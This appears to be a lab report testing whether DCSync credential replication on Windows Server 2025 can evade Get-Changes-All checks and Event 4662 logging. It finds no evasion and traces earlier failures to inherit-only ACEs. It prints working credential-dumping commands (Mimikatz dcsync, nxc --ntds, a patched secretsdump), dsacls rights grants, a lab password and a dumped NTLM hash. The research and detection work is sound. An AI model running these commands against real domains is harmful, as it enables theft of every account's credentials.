# Test Results — Windows Server 2025

**Target:** Windows Server 2025 DC @ 192.168.50.9
**Date:** 2026-08-01
**Domain:** WINDOMAIN2025 (windomain2025.local)
**Test User:** vagrant (RID 1002)
**Domain SID:** S-1-5-21-848663485-173066323-4266817888
**Known Good Hash:** `e02bc503339d51f71d913c245d35b50b`

---

## Final Result: Stealth DCSync is **NOT** viable on Windows Server 2025

After testing every flag/ExtendedOp variant and inspecting Event 4662 on the DC,
the DC **always** checks and logs GUID `1131f6ad` (DS-Replication-Get-Changes-All)
when credential attributes are requested. **No difference from Windows Server 2016
was found.**

---

## Environment

| Item | Value |
|---|---|
| OS | Microsoft Windows Server 2025 Standard Evaluation |
| Build | 26100 (10.0.26100) |
| Forest Level | Windows2025Forest |
| Domain Level | Windows2025Domain |
| DC Hostname | dc2025 |
| DC IP | 192.168.50.9 |
| Impacket (test client) | 0.13.1 |
| Test Client | Parrot OS 7.0.13 (Linux) |

---

## Variants Tested

| # | Variant | Flags | ExtendedOp | Hash Correct? | GUID 1131f6ad? | GUID 89e95b76? |
|---|---|---|---|---|---|---|
| **V1** | Baseline | `INIT_SYNC\|WRIT_REP` (0x30) | `EXOP_REPL_OBJ` (6) | YES | **YES** | NO |
| **V2** | No WRIT_REP | `INIT_SYNC` (0x20) | `EXOP_REPL_OBJ` (6) | YES | **YES** | NO |
| **V3** | SPECIAL_SECRET | `INIT_SYNC\|SPECIAL_SECRET` (0x04000020) | `EXOP_REPL_OBJ` (6) | NO* | **YES** | NO |
| **V4** | REPL_SECRETS no WRIT | `INIT_SYNC` (0x20) | `EXOP_REPL_SECRETS` (7) | YES | **YES** | NO |
| **V5** | REPL_SECRETS full | `INIT_SYNC\|WRIT_REP` (0x30) | `EXOP_REPL_SECRETS` (7) | YES | **YES** | NO |

\*V3: returned hash = `31d6cfe0d16ae931b73c59d7e0c089c0` (incorrect).
Expected: `DRS_SPECIAL_SECRET_PROCESSING` changes session key derivation, and
with impacket's default attribute set the decryption produces the wrong hash.
Same behavior observed on Server 2016.

**Every variant generates GUID `1131f6ad` in Event 4662.**

```
V1 (baseline):       Event 4662 -> {1131f6ad-...} + {1131f6aa-...}
V2 (no WRIT_REP):    Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
V3 (SPECIAL_SECRET): Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
V4 (REPL_SECRETS):   Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
V5 (REPL_SEC full):  Event 4662 -> {1131f6ad-...} + {1131f6aa-...}  <- IDENTICAL to V1
```

---

## Permission Test — No Get-Changes-All

| Account | Permissions | Result |
|---|---|---|
| dcsynctest | Get-Changes + Get-Changes-In-Filtered-Set (NO Get-Changes-All) | **ERROR_DS_DRA_BAD_DN (0x20f7)** |

Same error code (0x20f7) as Server 2016. **No Event 4662 generated.**

---

## Event 4662 Raw Data — with LogonID Isolation

All five variants ran in automated sequence (~1.4s total). Each variant received
a distinct LogonID, confirming events are isolated per execution (no cross-contamination):

| Variant | Timestamp (local) | LogonID |
|---|---|---|
| V1 (Baseline) | 06:22:25.871 | `0x300106` |
| V2 (No WRIT_REP) | 06:22:26.189 | `0x3001B7` |
| V3 (SPECIAL_SECRET) | 06:22:26.504 | `0x3010AB` |
| V4 (REPL_SECRETS no WRIT) | 06:22:26.837 | `0x3021E8` |
| V5 (REPL_SECRETS full) | 06:22:27.169 | `0x3022E0` |

### V1 (Baseline) — LogonID 0x300106:
```
Event: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V2 (No DRS_WRIT_REP) — LogonID 0x3001B7:
```
Event: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V3 (DRS_SPECIAL_SECRET_PROCESSING) — LogonID 0x3010AB:
```
Event: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V4 (EXOP_REPL_SECRETS, no WRIT_REP) — LogonID 0x3021E8:
```
Event: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### V5 (Full baseline + REPL_SECRETS) — LogonID 0x3022E0:
```
Event: {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes-All (SAME!)
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
Event: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}  <- Get-Changes
```

### dcsynctest (no Get-Changes-All):
```
NO Event 4662 generated
ERROR_DS_DRA_BAD_DN (0x20f7)
```

---

## Differences vs Server 2016

**No difference observed.** All results are identical:

| Dimension | Server 2016 | Server 2025 |
|---|---|---|
| GUID 1131f6ad in V1-V5 | YES | YES (identical) |
| GUID 89e95b76 in any variant | NO | NO (identical) |
| DCSync with SPECIAL_SECRET | Hash incorrect | Hash incorrect (same hash) |
| Permission filtered-set-only (correct ACE scope) | `0x2105` ACCESS_DENIED | `0x2105` (identical) |
| Event 4662 structure | 1x All + 2x Get-Changes | 1x All + 2x Get-Changes (identical) |
| Delegated account DCSync (correct ACE scope) | SUCCESS | SUCCESS (identical) |

**Delegated DCSync works as documented on both versions — once the ACE scope
is correct.** All earlier `0x20f7` results for delegated accounts were caused
by `dsacls /I:S` creating inherit-only ACEs that never applied to the domain
head object. See "Root Cause — Inherit-Only ACE (/I:S)" below.

Microsoft did not change the DRS permission check logic between Server 2016
and Server 2025. The authorization mechanism remains based on requested
attributes, not on DRS request flags.

---

## Technical Conclusion

1. **The permission check logic is the same as Server 2016.** The DC checks
   the ATTRIBUTES requested (not the request flags). When `unicodePwd` and
   `supplementalCredentials` are in `pPartialAttrSet`, the DC internally
   checks `Get-Changes-All` regardless of flags or ExtendedOp.

2. **The Event 4662 GUID is determined by the permission check, not by flags.**
   No flag combination avoids the `Get-Changes-All` check.

3. **`Get-Changes-In-Filtered-Set` does not cover secret attributes.** With a
   correctly scoped ACE, a filtered-set-only account requesting credential
   attributes gets `0x2105` (ACCESS_DENIED), and the Filtered-Set right
   (`89e95b76`) is not even checked — the Event 4662 trail shows only
   `1131f6aa`. See "Root Cause — Inherit-Only ACE (/I:S)" for the real
   Dimension C results.

### Detection timeline (identical to Server 2016):
```
1. Client -> DRSGetNCChanges(V8, pPartialAttrSet=[unicodePwd, suppCred], ulFlags=...)
2. DC checks: "unicodePwd in attr set?" -> YES -> check Get-Changes-All (GUID 1131f6ad)
3. DC checks: "suppCred in attr set?"   -> YES -> (already checked)
4. DC checks: baseline read -> check Get-Changes (GUID 1131f6aa)
5. Each check generates an Event 4662 with the corresponding GUID
6. NO combination of flags avoids the Get-Changes-All check
```

---

## Control Tests — Permission Rejection Isolation

**Date:** 2026-08-01 (initial) and 2026-08-01 (isolation round)

### Initial Round (dcsynctest, 3 control arms)

**Arm 0:** Reproduced 0x20f7 with dcsynctest (Get-Changes + Filtered-Set only).  
**Arm 1:** Blocked by harness bug (rpc_x_bad_stub_data). LDAP proxy evidence
confirms filtered-set works for non-secret attrs.  
**Arm 2:** Discovered that adding dcsynctest to Domain Admins made DCSync work,
while extended rights alone (even Full Control on NC) did not.

**Initial hypothesis:** DCSync requires Domain Admins.

---

### Isolation Round — Delegated DCSync Without Domain Admins

**Objective:** The Arm 2 finding contradicted well-established tradecraft.
A clean account (`dcsync2`) was tested to isolate the variable.

#### Test 1 — Clean Delegated Setup (2025 DC)

```
# gitleaks:allow
net user dcsync2 "Test123!" /add /domain
dsacls "dc=windomain2025,dc=local" /I:S /G "WINDOMAIN2025\dcsync2:CA;Replicating Directory Changes"
dsacls "dc=windomain2025,dc=local" /I:S /G "WINDOMAIN2025\dcsync2:CA;Replicating Directory Changes All"
```

dcsync2 has EXACTLY: Domain Users group + Get-Changes + Get-Changes-All.  
**Result:** `0x20f7` — FAILS.

#### Test 2 — Deny ACE Audit

Full ACL dump of the domain NC. **ZERO Deny ACEs found.** No explicit
blocking of dcsync2 directly or via group membership (Everyone, Auth Users,
Domain Users, Pre-Win2K).

#### Test 3 — Debug RPC Trace

```
[+] Calling DRSCrackNames for Administrator -> SUCCESS
[+] Calling DRSGetNCChanges for {guid}        -> 0x20f7
```

The failure occurs at `DRSGetNCChanges` line 662 (secretsdump.py 0.13.1).
DRSBind and DRSCrackNames succeed. Only the actual replication request fails.

#### Test 4 — Granting ALL Extended Rights

Added: Replication Synchronization, Manage Replication Topology, Filtered Set,
Full Control (GA) on domain NC, Generic Read, Schema NC Get-Changes-All.
All extra ACEs beyond the documented pair. **Result: STILL 0x20f7.**

Extended rights alone — even FULL CONTROL — are insufficient.

#### Test 5 — Administrative Group Membership

| Group | Get-Changes + Get-Changes-All | Result |
|---|---|---|
| Domain Users only | YES | 0x20f7 |
| BUILTIN\Administrators | YES | **SUCCESS** (hash e02bc50...) |
| Domain Admins | YES | **SUCCESS** |

Removing from Administrators (keeping extended rights) returns to 0x20f7.
Adding BACK to Administrators (no other changes) restores success.

**Event 4662 (dcsync2 as Administrator):** LogonID `0x12B89C4`, Subject `dcsync2`  
GUIDs: `{1131f6ad}` (Get-Changes-All) + `{1131f6aa}` x2 (Get-Changes)

#### Test 6 — Cross-Version (Server 2016)

Same setup (dcsync2, Get-Changes + Get-Changes-All only, Domain Users).
**Result: 0x20f7** — identical to 2025.  
Adding dcsync2 to BUILTIN\Administrators: **SUCCESS**.  
Behavior is cross-version consistent.

---

### Tiebreaker Round — Tool vs DC vs Flags

**Objective:** The isolation round left three competing explanations for why
a delegated account (Get-Changes + Get-Changes-All, no admin group) receives
0x20f7: (i) DC requires admin membership, (ii) impacket-specific behavior,
(iii) DRS_WRIT_REP flag triggers the check.

#### Braço B — Remove DRS_WRIT_REP (Flag Test)

Patched `secretsdump.py` line 646 to remove `DRS_WRIT_REP`:
```python
# Original: DRS_INIT_SYNC | DRS_WRIT_REP
# Patched:  DRS_INIT_SYNC  # NO_WRIT_REP
```

**Result: 0x20f7.** Removing WRIT_REP does NOT fix the delegated DCSync.
**Hypothesis (iii) FALSIFIED.** The flag is not the trigger.

#### Braço A — Alternative Tool (nxc 1.5.1)

`nxc smb 192.168.50.9 -u dcsync2 -p 'Test123!' -d WINDOMAIN2025 --ntds --user vagrant`

**Result: 0x20f7** (same error) + `rpc_s_access_denied` on RemoteOperations.
nxc uses the same impacket library under the hood, so this confirms impacket-
based tools share the behavior but does not isolate tool-vs-DC.

**Mimikatz test (planned):** The DetectionLab win10 VM (192.168.50.17) was
unreachable after boot (ports 445/5985 unresponsive). Mimikatz could not be
executed. This is the critical missing data point: if Mimikatz SUCCEEDS
where impacket fails, hypothesis (ii) is confirmed. If it FAILS, (i) is
confirmed. **Currently unresolved.**

#### Braço A — Mimikatz on DC 2025 (DEFINITIVE)

Mimikatz 2.2.0 executed on the 2025 DC itself as dcsync2 via
`Start-Process -Credential`:
```
mimikatz.exe "lsadump::dcsync /domain:windomain2025.local /user:vagrant" exit
```

**Result: `0x000020f7` (ERROR_DS_DRA_BAD_DN).**
```
ERROR kuhl_m_lsadump_dcsync ; GetNCChanges: 0x000020f7 (8439)
```

Mimikatz uses the Windows `DsGetNCChanges` API (Kerberos auth), a
completely independent code path from impacket (NTLM + raw DRS RPC).
Same error, same behavior.

| Tool | Auth | Platform | Result |
|---|---|---|---|
| impacket secretsdump | NTLM | Linux | 0x20f7 |
| nxc | NTLM | Linux | 0x20f7 |
| **Mimikatz 2.2.0** | **Kerberos** | **Windows** | **0x20f7** |

**Hypothesis (ii) FALSIFIED.** The behavior is NOT tool-specific.
Within this lab, hypothesis (i) is the one the data supports — with an
important scope limit: both DCs were promoted from the same DetectionLab
template, so an environmental cause shared by both forests is not excluded.

#### Braço A2 — Self-target test

`secretsdump -just-dc-user dcsync2` (dcsync2 targeting its own credentials).

**Result: 0x20f7.** Even targeting yourself fails — it's not about accessing
another user's attributes. The DRSGetNCChanges RPC itself is rejected.

#### Braço C — ACE Verification

```
Get-Acl "AD:\DC=windomain2025,DC=local" | ? {$_.IdentityReference -match "dcsync2"}
  -> Allow ExtendedRight {1131f6aa} (Get-Changes)
  -> Allow ExtendedRight {1131f6ad} (Get-Changes-All)
```

No Deny ACEs, no inherited blocking. The ACE set matches exactly what
BloodHound's DCSync edge represents. The configuration is correct per
documented tradecraft.

---

## Root Cause — Inherit-Only ACE (/I:S)

### Discovery

All previous rounds used `dsacls /I:S` which creates ACEs with
`PropagationFlags: InheritOnly` — the rights apply only to child objects,
never to the domain head object `DC=windomain2025,DC=local` where the DC
performs the permission check.

**Passo 1 — Verification (2026-08-02):**
```
InheritanceType       : Descendents
PropagationFlags      : InheritOnly
```
CONFIRMED — the ACEs never applied to the head object.

**Passo 2 — SharpHound with inherit-only ACE active:**
SharpHound v2.5.9 did NOT generate a DCSync edge for dcsync2 because the
ACE on the domain head was inherit-only. SharpHound correctly filters
these ACEs when computing attack paths.

**Passo 3 — Fix scope and retest:**
Revoked old ACEs, granted with default scope (this object + subobjects):
```
dsacls $dn /G "WINDOMAIN2025\dcsync2:CA;Replicating Directory Changes"
dsacls $dn /G "WINDOMAIN2025\dcsync2:CA;Replicating Directory Changes All"
```
New ACEs: `InheritanceType: None, PropagationFlags: None`.

Result: **SUCCESS** — `e02bc503339d51f71d913c245d35b50b`.
Event 4662: LogonID `0x27C7B69`, Subject `dcsync2`,
GUIDs: `{1131f6ad}` + `{1131f6aa}` x2.

The documented delegation model WORKS when the ACE scope is correct.

**Passo 4 — Real Dimension C (dcsync3, Filtered-Set + Get-Changes, NO All):**
With correct ACE scope (`InheritanceType: None`):
- **Secret attrs** (unicodePwd + supplementalCredentials): `0x2105` (ERROR_DS_DRA_ACCESS_DENIED)
  — not `0x20f7`! The correct error for insufficient rights.
  Event 4662: `{1131f6aa}` x2, **no** `{89e95b76}` (Filtered-Set not checked
  when credential attributes are in the request).
- The `0x20f7` error observed in ALL previous rounds was an artifact of
  the inherit-only ACE scope, not a missing right.

### Error Code Mapping (after fix)

| ACE Scope | Missing Right | Error | Meaning |
|---|---|---|---|
| Inherit-only (/I:S) | Any | `0x20f7` | ACE not found on head object (false "bad DN") |
| This object (correct) | Get-Changes-All | `0x2105` | Access Denied (correct) |
| This object (correct) | None (has All) | SUCCESS | Works as documented |

### Conclusion

**The anomaly is RESOLVED.** All previous rounds measured a failure of
ACE scope (`/I:S` = inherit-only), not a DC behavior. The documented
DCSync delegation model works correctly on both Server 2016 and 2025
when the ACE is applied to the domain head object.

The practical lesson: `dsacls /I:S` is for child objects only. Use
`/G` (no `/I:S`) or `/I:T` for the domain NC head object when
delegating DCSync rights.
